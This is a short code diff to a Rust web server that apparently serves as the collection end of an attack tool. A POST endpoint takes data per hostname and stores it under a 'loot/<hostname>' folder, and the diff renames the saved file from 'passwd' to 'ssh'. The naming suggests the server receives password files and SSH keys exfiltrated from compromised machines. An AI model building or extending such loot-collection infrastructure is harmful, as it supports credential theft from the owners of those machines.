@@ -25,7 +25,7 @@ fn command() -> String {
 }
 #[post("/post/<hostname>/ssh", format = "plain", data = "<data>")]
 async fn ssh(data: Data<'_>, hostname: String) -> std::io::Result<()> {
-    let file_location = format!("loot/{}/passwd", hostname);
+    let file_location = format!("loot/{}/ssh", hostname);
     let dir = format!("loot/{}", hostname);
     fs::create_dir_all(&dir).ok();
     println!("The dir created is {}.", &dir);
